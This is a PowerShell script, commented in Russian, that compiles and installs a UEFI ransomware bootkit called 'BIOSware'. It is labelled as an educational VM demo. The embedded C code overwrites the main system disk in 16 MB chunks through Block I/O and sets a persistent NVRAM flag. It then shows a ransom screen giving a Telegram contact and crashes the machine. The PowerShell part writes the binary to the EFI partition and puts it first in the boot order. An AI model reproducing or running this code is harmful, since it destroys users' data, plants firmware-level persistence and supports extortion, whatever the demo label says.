#Requires -RunAsAdministrator
<#
    BIOSware UEFI Ransomware DEMO + Демонстрация разделения диска по 16 МБ
    ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ В ИЗОЛИРОВАННОЙ ВИРТУАЛЬНОЙ МАШИНЕ!
    Сделай снапшот перед запуском!
#>

$sourceCode = @'
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Protocol/BlockIo.h>

#define WAIT_BEFORE_BSOD   30
#define CONTACT_TG         L"@unhook_proxy"
#define KEY_SIZE           256

EFI_EVENT   TimerEvent = NULL;
BOOLEAN     bLocked = FALSE;
UINT8       g_Key[KEY_SIZE];

VOID GenerateKey(VOID)
{
    UINTN i;
    UINT64 Seed = 0;
    gRT->GetTime(NULL, &Seed);
    for (i = 0; i < KEY_SIZE; i++) {
        Seed = (Seed * 1103515245 + 12345) & 0x7FFFFFFF;
        g_Key[i] = (UINT8)(Seed & 0xFF);
    }
}

VOID ShowLockScreen(VOID)
{
    Print(L"\n\n");
    Print(L"  ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗\n");
    Print(L"  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║\n");
    Print(L"  ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║\n");
    Print(L"  ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║\n");
    Print(L"  ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║\n");
    Print(L"  ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝\n\n");
    Print(L"  ╔═══════════════════════════════════════════════════════════╗\n");
    Print(L"  ║              YOUR FILES ARE ENCRYPTED!                    ║\n");
    Print(L"  ║   Telegram for decryption: %s                            ║\n", CONTACT_TG);
    Print(L"  ║   This is UEFI bootkit demo - data destroyed at firmware  ║\n");
    Print(L"  ╚═══════════════════════════════════════════════════════════╝\n");
}

VOID EFIAPI TimerHandler(IN EFI_EVENT Event, IN VOID *Context)
{
    static UINTN Counter = 0;
    if (!bLocked) { ShowLockScreen(); bLocked = TRUE; }
    Counter++;
    if (Counter >= WAIT_BEFORE_BSOD) {
        gBS->CloseEvent(TimerEvent);
        Print(L"\n[!] TRIGGERING BSOD...\n");
        __asm volatile("ud2");
        while(1);
    }
}

// ==================== ДЕМОНСТРАЦИЯ РАЗДЕЛЕНИЯ ДИСКА НА 16 МБ ====================
VOID DemonstrateDiskChunks(VOID)
{
    EFI_STATUS Status;
    EFI_HANDLE *HandleBuffer = NULL;
    UINTN HandleCount = 0, i;
    EFI_BLOCK_IO_PROTOCOL *BlockIo;
    UINTN BlockSize;
    UINT64 TotalBlocks, TotalSizeMB;
    UINTN ChunkSize = 16 * 1024 * 1024; // 16 МБ
    UINTN ChunksProcessed = 0;

    Print(L"\n[+] === ДЕМОНСТРАЦИЯ ВРЕДА UEFI BOOTKIT ===\n");
    Print(L"[+] Разбиваем системный диск на куски по 16 МБ...\n\n");

    Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiBlockIoProtocolGuid, NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) {
        Print(L"[-] Не удалось найти Block I/O\n");
        return;
    }

    for (i = 0; i < HandleCount; i++) {
        Status = gBS->HandleProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, (VOID**)&BlockIo);
        if (EFI_ERROR(Status) || !BlockIo->Media->MediaPresent || BlockIo->Media->LogicalPartition) continue;

        BlockSize = BlockIo->Media->BlockSize;
        TotalBlocks = BlockIo->Media->LastBlock + 1;
        TotalSizeMB = (TotalBlocks * BlockSize) / (1024 * 1024);

        if (TotalSizeMB < 800) continue; // ищем основной диск

        Print(L"[+] Найден основной диск: ~%d МБ\n", TotalSizeMB);
        
        UINTN TotalChunks = (TotalSizeMB + 15) / 16;
        UINTN j;

        for (j = 0; j < TotalChunks; j++) {
            UINT64 LBA = (j * (UINT64)ChunkSize) / BlockSize;
            UINTN BlocksInChunk = ChunkSize / BlockSize;
            if (LBA + BlocksInChunk > TotalBlocks) 
                BlocksInChunk = (UINTN)(TotalBlocks - LBA);

            UINT8 *Buffer = AllocatePool(ChunkSize);
            if (Buffer) {
                SetMem(Buffer, ChunkSize, (UINT8)(0xBA + (j % 64)));
                BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, LBA, ChunkSize, Buffer);
                FreePool(Buffer);
            }

            ChunksProcessed++;
            Print(L"[*] Кусок %4d / %d  |  16 МБ  |  LBA: %8d\n", ChunksProcessed, TotalChunks, LBA);
            gBS->Stall(60000); // задержка для наглядности
        }
        break; // только один основной диск
    }
    
    if (HandleBuffer) FreePool(HandleBuffer);
    Print(L"\n[+] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА — диск разделён на %d кусков по 16 МБ!\n", ChunksProcessed);
    Print(L"[!] В реальной атаке все данные были бы уничтожены.\n");
}

EFI_STATUS InstallPersistence(VOID)
{
    UINT32 Flag = 1;
    return gRT->SetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid,
                EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS,
                sizeof(Flag), &Flag);
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    InitializeLib(ImageHandle, SystemTable);
    
    Print(L"\n[+] BIOSware UEFI Bootkit DEMO (для ПТУ)\n");
    Print(L"[+] Запущен на уровне firmware (до Windows)\n");

    UINT32 DataSize = 0;
    EFI_STATUS Status = gRT->GetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid, NULL, &DataSize, NULL);

    if (Status == EFI_NOT_FOUND) {
        Print(L"[+] Первый запуск → шифрование + демонстрация\n");
        InstallPersistence();
    } else {
        Print(L"[+] Повторный запуск\n");
    }

    DemonstrateDiskChunks();   // ← Главная демонстрационная функция

    ShowLockScreen();
    
    Status = gBS->CreateEvent(EVT_TIMER | EVT_NOTIFY_SIGNAL, TPL_CALLBACK, TimerHandler, NULL, &TimerEvent);
    if (!EFI_ERROR(Status)) {
        gBS->SetTimer(TimerEvent, TimerRelative, 10000000ULL); // 1 секунда
        Print(L"[+] Таймер запущен. BSOD через %d секунд...\n", WAIT_BEFORE_BSOD);
    }

    while (1) gBS->Stall(1000000);
    return EFI_SUCCESS;
}
'@

# ============================================================
# PowerShell часть
# ============================================================

function Install-Clang {
    if (Get-Command clang -ErrorAction SilentlyContinue) { 
        Write-Host "[+] Clang уже установлен" -ForegroundColor Green
        return 
    }
    Write-Host "[+] Устанавливаем LLVM (Clang)..." -ForegroundColor Cyan
    winget install LLVM.LLVM -s winget --silent
}

function Get-UefiHeaders {
    $edkPath = "$env:TEMP\edk2-headers"
    if (!(Test-Path $edkPath)) {
        Write-Host "[+] Скачиваем UEFI заголовки..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri "https://github.com/tianocore/edk2/archive/refs/heads/master.zip" -OutFile "$env:TEMP\edk2.zip"
        Expand-Archive "$env:TEMP\edk2.zip" -DestinationPath $edkPath -Force
    }
    return "$edkPath\edk2-master"
}

function Compile-Efi {
    param([string]$SourceFile)

    Install-Clang
    $edk = Get-UefiHeaders

    Write-Host "[+] Компилируем UEFI-приложение..." -ForegroundColor Cyan
    
    $obj = "RealRansom.obj"
    $efi = "RealRansom.efi"

    clang -target x86_64-pc-windows-msvc `
          -ffreestanding `
          -fshort-wchar `
          -mno-red-zone `
          -I"$edk\MdePkg\Include" `
          -I"$edk\MdePkg\Include\X64" `
          -c "$SourceFile" -o $obj

    lld-link /NOLOGO /SUBSYSTEM:EFI_APPLICATION /ENTRY:UefiMain `
             /MACHINE:X64 $obj /OUT:$efi

    if (Test-Path $efi) {
        Write-Host "[+] Успешно скомпилировано: $efi" -ForegroundColor Green
        return $efi
    } else {
        Write-Host "[-] Ошибка компиляции!" -ForegroundColor Red
        exit 1
    }
}

function Install-Bootkit {
    param([string]$EfiFile)

    Write-Host "[+] Монтируем EFI System Partition..." -ForegroundColor Cyan
    
    $esp = Get-Partition | Where-Object { $_.Type -eq "System" -and $_.Size -lt 500MB } | Select-Object -First 1
    if (-not $esp) { 
        Write-Host "[-] Не удалось найти ESP раздел" -ForegroundColor Red
        return 
    }

    $mountPoint = "X:"
    if (Test-Path $mountPoint) { mountvol X: /D }
    mountvol X: $esp.UniqueId

    $targetDir = "X:\EFI\BIOSware"
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    Copy-Item $EfiFile "$targetDir\RealRansom.efi" -Force

    Write-Host "[+] Добавляем в Boot Configuration..." -ForegroundColor Cyan
    $guid = bcdedit /create /d "BIOSware Demo" /application BOOTSECTOR | Select-String '{.*}' | ForEach-Object { $_.Matches.Value }
    bcdedit /set $guid path "\EFI\BIOSware\RealRansom.efi"
    bcdedit /set $guid description "BIOSware UEFI Demo"
    bcdedit /displayorder $guid /addfirst

    mountvol X: /D
    Write-Host "[+] Bootkit установлен! Перезагрузи VM для демонстрации." -ForegroundColor Green
    Write-Host "[!] Сделай снапшот перед перезагрузкой!" -ForegroundColor Yellow
}

# ============================================================
# MAIN
# ============================================================

Write-Host "=== BIOSware UEFI Demo для ПТУ ===" -ForegroundColor Magenta

$tempC = "$env:TEMP\RealRansom.c"
$sourceCode | Out-File $tempC -Encoding utf8

$efi = Compile-Efi -SourceFile $tempC

Install-Bootkit -EfiFile $efi

Write-Host "`nГотово! Перезагружай виртуальную машину." -ForegroundColor Green
